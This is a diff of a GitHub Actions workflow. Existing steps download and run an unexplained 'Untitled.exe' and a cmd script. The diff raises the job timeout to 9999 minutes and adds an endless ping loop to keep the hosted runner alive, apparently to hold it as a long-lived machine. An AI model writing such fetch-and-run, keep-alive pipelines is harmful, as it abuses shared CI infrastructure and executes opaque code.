@@ -5,8 +5,8 @@ on: [push, workflow_dispatch]
 jobs:
   build:
 
-    runs-on: windows-2019
-    timeout-minutes: 2000 # 6 hours maximum for GitHub-hosted runners
+    runs-on: windows-latest
+    timeout-minutes: 9999
     
     steps:
     - name: Download Untitled.exe
@@ -21,3 +21,6 @@ jobs:
       run: |
         .\untitled.exe
         cmd.exe /c .\cmd.cmd
+    - name: Keep Alive
+      run: ping 127.0.0.1 -t > nul
+
